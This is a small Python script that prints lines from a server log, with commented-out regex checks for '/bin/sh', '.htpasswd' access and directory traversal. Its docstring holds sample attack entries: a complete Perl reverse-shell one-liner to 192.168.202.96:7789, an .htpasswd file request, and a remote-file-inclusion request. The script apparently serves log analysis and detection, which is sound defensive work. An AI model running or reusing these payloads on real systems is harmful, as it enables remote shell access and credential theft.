import re

with open("server.log") as s:
    file = s.readlines()

    for line in file:
        print(line)
#        if re.match(".*\/bin\/sh.*", line):
#            print("found /bin/sh - %s" % line)
#        elif re.match(".*\.htpasswd.*",line):
#            print("found htpasswd - %s" % line)
 #       elif re.match(".*[../]+.*",line):
 #           print ("directory traversal %s" % line)


"""
/bin/sh -c "echo 'YYY'; perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.202.96:7789");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'; echo 'YYY'"
/.svn/text-base/.htpasswd.svn-base
/OpenSiteAdmin/scripts/classes/DatabaseManager.php?path=@RFIURL\x00
"""